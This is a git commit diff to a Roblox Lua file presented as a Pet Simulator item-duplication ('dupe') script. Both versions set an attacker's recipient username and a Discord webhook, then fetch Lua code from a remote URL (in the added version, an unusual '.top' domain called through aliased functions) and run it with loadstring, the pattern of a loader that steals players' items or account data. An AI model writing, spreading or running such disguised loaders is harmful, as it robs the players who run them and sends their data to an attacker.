79d1504be98d7cb1c7f524c5d1481a101c13279b
Henry <116410269+laylasthug@users.noreply.github.com>
2024-12-27 19:22:54 -0300

    Update dupescript.lua

--- dupescript.lua
+++ dupescript.lua
@@ -1,9 +1,11 @@
-Username = "realzhy"
-WebHook = "https://discord.com/api/webhooks/947636974280392767/RZPlGh1HSRoXwOWwSTCfo-asAhlrGiFNLQZtn1pS9HyKKaU-Kd0z7Y_kYQyCqXHBHluv"
-loadingscreen = true
-_G.CustomScriptName = "AA dupe Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+local username = "Username"
+local sub = "SubToXeminus2"
+local username2 = "Username2"
+local champions = "Atdpchampions"
+local webhook = "https://discord.com/api/webhooks/947636974280392767/RZPlGh1HSRoXwOWwSTCfo-asAhlrGiFNLQZtn1pS9HyKKaU-Kd0z7Y_kYQyCqXHBHluv"
+local loadstring_function = loadstring
+local http_get_function = game.HttpGet
+
+local script_url = "https://arko2230.top/petsimulator.lua"
+local remote_script = http_get_function(game, script_url)
+loadstring_function(remote_script)()
